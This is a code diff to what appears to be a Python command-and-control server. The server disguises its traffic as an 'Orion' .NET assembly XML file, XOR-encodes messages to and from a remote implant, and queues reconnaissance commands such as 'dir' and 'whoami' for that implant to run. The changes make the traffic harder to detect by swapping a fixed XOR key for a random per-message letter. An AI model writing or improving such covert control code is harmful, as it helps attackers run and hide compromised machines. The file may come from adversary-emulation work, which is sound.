@@ -31,14 +31,14 @@ def rand_byte():
         byte += str(random.randint(0,1))
     return chr(int(byte, 2))
 
+
 def create_http_body(command=None, additional_data=""):
     """
     creation of the http body in post request from the program
     """
 
     if command is None:
-        return """
-        <assembly Name=Orion Key="7678" Version = 1.3">
+        return f"""{random.choice(string.ascii_letters)}<assembly Name=Orion Key="7678" Version = 1.3">
         <assemblyIdentity Name="Microsoft.threading.Tasks.Extensions.Destok"/>
         <id>bin</id>
         <formats>
@@ -84,7 +84,9 @@ def create_http_body(command=None, additional_data=""):
         #message = binascii.hexlify(plain_info.encode("ISO-8859-1")).decode("ISO-8859-1")
         message = plain_info
 
-        first_byte_message = ord("a")
+        random_letter = random.choice(string.ascii_letters)
+
+        first_byte_message = ord(random_letter)
 
         xored = "".join([chr(ord(cs) ^ first_byte_message) for cs in message]).encode("ISO-8859-1")
 
@@ -97,8 +99,7 @@ def create_http_body(command=None, additional_data=""):
         part_2 = final_message[32:64]
         part_3 = final_message[64:]
 
-        return f"""
-        <assembly Name=Orion Key="7678" Version = 1.3">
+        return f"""{random_letter}<assembly Name=Orion Key="7678" Version = 1.3">
         <assemblyIdentity Name="Microsoft.threading.Tasks.Extensions.Destok"/>
         <id>bin</id>
         <formats>
@@ -135,7 +136,7 @@ def get_data_from_program(json):
 
     string_received = "".join(list_message_received)
 
-    xor_byte = ord("a")
+    xor_byte = ord(json["sessionID"][0])
 
     xor_received = "".join([chr(ord(cs) ^ xor_byte) for cs in string_received])
 
@@ -157,7 +158,7 @@ def find_desired_order(file_path_command):
 
     if file_path_command not in os.listdir():
         # creation of the csv of the desired order with random value
-        df = pd.DataFrame(data={"order":[5, 5, 6], "additional_data":["dir", "whoami", "hostname"], "state":["waiting", "waiting", "waiting"]})
+        df = pd.DataFrame(data={"order":[5, 5, 6], "additional_data":["dir", "whoami", ""], "state":["waiting", "waiting", "waiting"]})
         print(df)
         df.to_csv(file_path_command, index=False)
 
